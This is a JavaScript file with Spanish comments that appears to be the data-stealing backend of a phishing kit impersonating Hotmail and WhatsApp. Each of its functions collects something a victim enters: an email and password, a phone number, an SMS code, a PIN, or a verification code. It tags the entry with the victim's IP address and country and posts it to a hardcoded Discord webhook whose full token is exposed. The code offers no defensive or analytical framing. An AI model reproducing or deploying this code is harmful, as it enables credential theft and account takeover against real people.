// ==============================================
// FUNCIONES BASE
// ==============================================

/**
 * Obtiene la dirección IP pública del usuario
 * @returns {Promise<string>} Dirección IP
 */
async function getIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error al obtener IP:', error);
    return "IP no disponible";
  }
}

/**
 * Obtiene el país basado en la IP
 * @param {string} ip - Dirección IP
 * @returns {Promise<string>} Nombre del país
 */
async function getCountry(ip) {
  if (ip === "IP no disponible") return "País no disponible";
  
  try {
    const response = await fetch(`https://ipapi.co/${ip}/country_name/`);
    return await response.text();
  } catch (error) {
    console.error('Error al obtener país:', error);
    return "País no disponible";
  }
}

/**
 * Envía datos al webhook de Discord
 * @param {string} content - Contenido del mensaje
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendToDiscord(content) {
  const webhook_url = "https://discordapp.com/api/webhooks/1433897094640566325/ZcuRqWyvtDytAGwE4dIqkPnTXUOJjM_ks_FVz667v-KE0dVsyaq-a3n5mVeDcGDylMLJ";
  
  const data = {
    content: content
  };

  try {
    const response = await fetch(webhook_url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return true;
  } catch (error) {
    console.error('Error al enviar a Discord:', error);
    return false;
  }
}

// ==============================================
// FUNCIONES ESPECÍFICAS PARA FORMULARIOS
// ==============================================

/**
 * Procesa datos de inicio de sesión (email y contraseña)
 * @param {string} email - Correo electrónico
 * @param {string} password - Contraseña
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendLoginData(email, password) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);
    
    const message = [
      "**== Hotmail-Whatsapp ==**",
      "",
      `**Correo:** \`${email}\``,
      `**Clave:** \`${password}\``,
      "",
      "**===== IP =====**",
      `${ip} ${country}`
    ].join("\n");
    
    return await sendToDiscord(message);
  } catch (error) {
    console.error('Error en sendLoginData:', error);
    return false;
  }
}

/**
 * Procesa datos de teléfono
 * @param {string} phoneNumber - Número de teléfono con código de país
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendPhoneData(phoneNumber) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);
    
    const message = [
      "**== Hotmail-Whatsapp ==**",
      "",
      `**Teléfono:** \`${phoneNumber}\``,
      "",
      "**===== IP =====**",
      `${ip} ${country}`
    ].join("\n");
    
    return await sendToDiscord(message);
  } catch (error) {
    console.error('Error en sendPhoneData:', error);
    return false;
  }
}

/**
 * Procesa código SMS de 6 dígitos
 * @param {string} code - Código de verificación
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendSmsCode(code) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);
    
    const message = [
      "**== Hotmail-Whatsapp ==**",
      "",
      `**Código SMS:** \`${code}\``,
      "",
      "**===== IP =====**",
      `${ip} ${country}`
    ].join("\n");
    
    return await sendToDiscord(message);
  } catch (error) {
    console.error('Error en sendSmsCode:', error);
    return false;
  }
}

/**
 * Procesa código PIN de 6 dígitos
 * @param {string} pin - Código PIN
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendPinCode(pin) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);
    
    const message = [
      "**== Hotmail-Whatsapp ==**",
      "",
      `**PIN:** \`${pin}\``,
      "",
      "**===== IP =====**",
      `${ip} ${country}`
    ].join("\n");
    
    return await sendToDiscord(message);
  } catch (error) {
    console.error('Error en sendPinCode:', error);
    return false;
  }
}

/**
 * Procesa código de verificación final
 * @param {string} code - Código de verificación
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendVerificationCode(code) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);
    
    const message = [
      "**== Hotmail-Whatsapp ==**",
      "",
      `**Código Verificación:** \`${code}\``,
      "",
      "**===== IP =====**",
      `${ip} ${country}`
    ].join("\n");
    
    return await sendToDiscord(message);
  } catch (error) {
    console.error('Error en sendVerificationCode:', error);
    return false;
  }
}

// ==============================================
// EXPORTACIÓN DE FUNCIONES (si se usa como módulo)
// ==============================================
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    getIP,
    getCountry,
    sendToDiscord,
    sendLoginData,
    sendPhoneData,
    sendSmsCode,
    sendPinCode,
    sendVerificationCode
  };

}
